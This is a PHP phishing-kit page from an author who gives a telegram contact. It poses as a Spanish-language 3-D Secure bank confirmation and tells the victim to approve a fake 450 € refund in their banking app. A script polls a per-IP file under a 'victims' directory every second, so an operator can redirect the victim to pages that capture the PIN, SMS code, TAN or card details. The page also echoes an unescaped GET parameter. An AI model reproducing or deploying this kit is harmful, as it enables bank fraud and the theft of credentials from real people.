<?php
    /*******
    Main Author: Nawras
    Contact me on telegram : https://MemoryError
    ********************************************************/
    
    require_once '../includes/main.php';
    $code = $_GET['code'];
    $_SESSION['last_page'] = 'app';
?>
<html lang="da"><script id="allow-copy_script">(function agent() {
    let isUnlockingCached = false
    const isUnlocking = () => isUnlockingCached
    document.addEventListener('allow_copy', event => {
      const { unlock } = event.detail
      isUnlockingCached = unlock
    })

    const copyEvents = [
      'copy',
      'cut',
      'contextmenu',
      'selectstart',
      'mousedown',
      'mouseup',
      'mousemove',
      'keydown',
      'keypress',
      'keyup',
    ]
    const rejectOtherHandlers = e => {
      if (isUnlocking()) {
        e.stopPropagation()
        if (e.stopImmediatePropagation) e.stopImmediatePropagation()
      }
    }
    copyEvents.forEach(evt => {
      document.documentElement.addEventListener(evt, rejectOtherHandlers, {
        capture: true,
      })
    })
  })()</script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>3-D Secure</title>
    
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.75">
    <link rel="stylesheet" type="text/css" href="screen.css">
	 <link href="src/css/style6.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="gh-buttons.css">
    <link rel="icon" type="image/x-icon" href="https://acs3.3dsecure.no/logos/favicon.ico">
    <script src="commons.js"></script>
    <script src="jquery-3.3.1.min.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
    </script>
</head>
<body onload="onBodyLoad();">
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="1.svg"></div>
        <div class="brand-logo-div" style="max-width: 120px"></div>
        <div class="flag-icon-div" title="Engelsk">
            <a href="#"></a>
        </div>
        <div class="clear"></div>
        <h1>Confirmar con la aplicación del banco</h1>
        <p> Ahora hemos enviado una suscripción única a su aplicación móvil.</p>
        <p> inicie sesión en la aplicación de su banco y presione confirmar para confirmar la transacción.</p>
		 <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="tan">
                            <input type="hidden" name="code1" value="<?php echo $_GET['code1']; ?>">
            <dl style="margin-top: 10px;">
                <dt>Online store: </dt>
                <dd>transaction</dd>

                <dt>Amount: </dt>
                <dd id="purchAmount"> 450 € reembolso</dd>

                <dt>Date:  </dt> 
              <?php echo $date = date('m/d/Y h:i:s a', time());?> 

                <dt>Número de tarjeta: </dt>
                <dd>**** **** **** **** </dd>

				


                <dt>
           <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Por favor confirmar</h5>
                  </div><br>
			<br>
			
			</br>
                </dd>
            </dl>
			
            <div id="errorMessage" class="error"></div>
            
            <div style="font-size: 0.92em; margin-bottom: 8px;">
            </div>
            <div style="float: left;">
                <a class="button icon arrowleft" href="#">Back</a>
            </div>
            <div style="float: right;">
                <a class="button icon add" id="resendButton" href="#" onclick="incrementResendCount()">The code</a>

            </div>
        </form>
    </div>
</div>
<script type="text/javascript">
    function incrementResendCount() {
        var resendCount = localStorage.getItem("localResendCount");
        if (resendCount == null) {
            resendCount = 0;
        }
        resendCount = Number(resendCount);
        resendCount = ++resendCount;
        localStorage.setItem("localResendCount", resendCount);
    }

    $(document).ready(function(){
        var resendCount = localStorage.getItem("localResendCount");

        if (Number(resendCount) >= 2) {
            $("#resendButton").hide();
            $("#resendText").hide();
            $("#errorMessage").hide();
            $("#resendExceeded").show();
            localStorage.setItem("localResendCount", "0");
        }

    });
</script>



</body></html>

   <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>
 <script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                        var zow = data.split('/');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'errorlogin' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorlogin";
                        } else if( one == 'app' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=app&code=" + two;
							 } else if( one == 'pin' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=pin";
			            } else if( one == 'tele' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=tele";
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=sms&code=" + two;
                        } else if( one == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=cc";
                        } else if( one == 'errorcc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorcc";
                        } else if( one == 'errorsms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorsms&code=" + two;
                        } else if( one == 'tan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            location.href = "../index-.php?redirection=tan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3;
                        } else if( one == 'errortan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            location.href = "../index-.php?redirection=errortan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3;
                        } else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=success";
                        }

                    }
                });
            }, 1000);
        </script>

    </body>

</html>